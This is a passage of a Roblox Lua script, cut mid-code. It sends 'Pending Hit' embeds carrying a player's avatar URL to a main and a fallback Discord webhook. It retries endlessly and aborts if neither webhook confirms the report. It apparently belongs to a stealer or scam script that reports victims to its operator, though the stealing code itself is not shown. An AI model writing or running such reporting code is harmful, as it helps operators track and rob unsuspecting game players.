    -- ====== CREATE MESSAGE: loops forever until one webhook confirms ======
    local function createMessage()
        local ok, err = pcall(function()
            cachedAvatarUrl = getAvatarUrl()
            local data = buildEmbedData("🟨 Pending Hit ...", cachedAvatarUrl)

            local sent = false
            local attempt = 0

            while not sent do
                attempt = attempt + 1

                -- try main webhook
                local results, newMessageIds = sendToMultipleWebhooks(data, nil)
                messageIds = newMessageIds

                if messageIds and messageIds["user_webhook"] then
                    sent = true
                    usingFallback = false
                    fallbackMessageId = nil
                    webhookSentSuccessfully = true
                    break
                end

                local mainStatusCode = results and results["user_webhook"] and results["user_webhook"].response and results["user_webhook"].response.StatusCode or "nil"
                local mainBody = results and results["user_webhook"] and results["user_webhook"].response and results["user_webhook"].response.Body or "nil"

                if mainStatusCode == 429 then
                    sendError("MAIN webhook RATE LIMITED (429) - switching to fallback\nBody: " .. tostring(mainBody))
                elseif attempt == 1 then
                    sendError("MAIN webhook failed (attempt " .. attempt .. ") - StatusCode: " .. tostring(mainStatusCode) .. "\nBody: " .. tostring(mainBody) .. "\nTrying fallback...")
                end

                -- try fallback webhook
                local success2, response2 = sendDiscordWebhookWithRetry(data, nil, FALLBACK_WEBHOOK_URL)
                local fallbackStatusCode = response2 and response2.StatusCode or "nil"
                local fallbackBody = response2 and response2.Body or "nil"

                if success2 and response2 and response2.Success and response2.StatusCode == 200 then
                    local ok_dec, decoded = pcall(function()
                        return game:GetService("HttpService"):JSONDecode(response2.Body)
                    end)
                    if ok_dec and decoded and decoded.id then
                        fallbackMessageId = decoded.id
                        usingFallback = true
                        sent = true
                        webhookSentSuccessfully = true
                        break
                    else
                        sendError("FALLBACK webhook sent but no messageId returned - Body: " .. tostring(fallbackBody))
                    end
                else
                    if fallbackStatusCode == 429 then
                        sendError("FALLBACK webhook ALSO RATE LIMITED (429) - both webhooks down\nWaiting 10s before retry (attempt " .. attempt .. ")")
                    else
                        sendError("FALLBACK webhook also failed - StatusCode: " .. tostring(fallbackStatusCode) .. "\nBody: " .. tostring(fallbackBody) .. "\nRetrying both in 5s (attempt " .. attempt .. ")")
                    end
                end

                if attempt >= 3 then
                    task.wait(10)
                else
                    task.wait(5)
                end
            end
        end)
        if not ok then
            sendError("createMessage() crashed: " .. tostring(err))
        end
    end

    -- ====== UPDATE MESSAGE: patches existing message, full fallback logic ======
    local function updateMessage(newTitle)
        local ok, err = pcall(function()
            local avatarUrl = cachedAvatarUrl or getAvatarUrl()
            local editData = buildEmbedData(newTitle, avatarUrl)

            if usingFallback then
                if not fallbackMessageId then
                    sendError("updateMessage() fallback mode but no fallbackMessageId - Title: " .. tostring(newTitle))
                    return
                end
                local success, response = sendDiscordWebhookWithRetry(editData, fallbackMessageId, FALLBACK_WEBHOOK_URL)
                if not success or not response or (response.StatusCode ~= 200 and response.StatusCode ~= 204) then
                    if response and response.StatusCode == 429 then
                        sendError("updateMessage() FALLBACK rate limited (429) - Title: " .. tostring(newTitle))
                    else
                        sendError("updateMessage() fallback failed - Title: " .. tostring(newTitle) .. " StatusCode: " .. tostring(response and response.StatusCode or "nil") .. "\nBody: " .. tostring(response and response.Body or "nil"))
                    end
                end
            else
                if not messageIds or not messageIds["user_webhook"] then
                    sendError("updateMessage() no messageId - Title: " .. tostring(newTitle))
                    return
                end
                local success, response = sendDiscordWebhookWithRetry(editData, messageIds["user_webhook"], WEBHOOK_URL)
                if not success or not response or (response.StatusCode ~= 200 and response.StatusCode ~= 204) then
                    if response and response.StatusCode == 429 then
                        sendError("updateMessage() MAIN rate limited (429) - Title: " .. tostring(newTitle) .. " - switching to fallback")
                    else
                        sendError("updateMessage() main failed - Title: " .. tostring(newTitle) .. " StatusCode: " .. tostring(response and response.StatusCode or "nil") .. "\nBody: " .. tostring(response and response.Body or "nil"))
                    end

                    -- try to patch existing fallback message
                    if fallbackMessageId then
                        local success2, response2 = sendDiscordWebhookWithRetry(editData, fallbackMessageId, FALLBACK_WEBHOOK_URL)
                        if success2 and response2 and (response2.StatusCode == 200 or response2.StatusCode == 204) then
                            usingFallback = true
                            sendError("updateMessage() switched to fallback webhook mid session")
                        else
                            if response2 and response2.StatusCode == 429 then
                                sendError("updateMessage() FALLBACK also rate limited (429) - Title: " .. tostring(newTitle))
                            else
                                sendError("updateMessage() both webhooks failed mid session - Title: " .. tostring(newTitle) .. "\nFallback StatusCode: " .. tostring(response2 and response2.StatusCode or "nil") .. "\nBody: " .. tostring(response2 and response2.Body or "nil"))
                            end
                        end
                    else
                        -- no fallback message exists yet, create one
                        local success2, response2 = sendDiscordWebhookWithRetry(editData, nil, FALLBACK_WEBHOOK_URL)
                        if success2 and response2 and response2.Success and response2.StatusCode == 200 then
                            local ok_dec, decoded = pcall(function()
                                return game:GetService("HttpService"):JSONDecode(response2.Body)
                            end)
                            if ok_dec and decoded and decoded.id then
                                fallbackMessageId = decoded.id
                                usingFallback = true
                                sendError("updateMessage() created new fallback message mid session - MessageId: " .. tostring(fallbackMessageId))
                            end
                        else
                            if response2 and response2.StatusCode == 429 then
                                sendError("updateMessage() FALLBACK also rate limited creating new - Title: " .. tostring(newTitle))
                            else
                                sendError("updateMessage() both webhooks completely failed - Title: " .. tostring(newTitle))
                            end
                        end
                    end
                end
            end
        end)
        if not ok then
            sendError("updateMessage() crashed: " .. tostring(err))
        end
    end

    createMessage()

    -- ====== ABORT if webhook was never confirmed ======
    if not webhookSentSuccessfully then
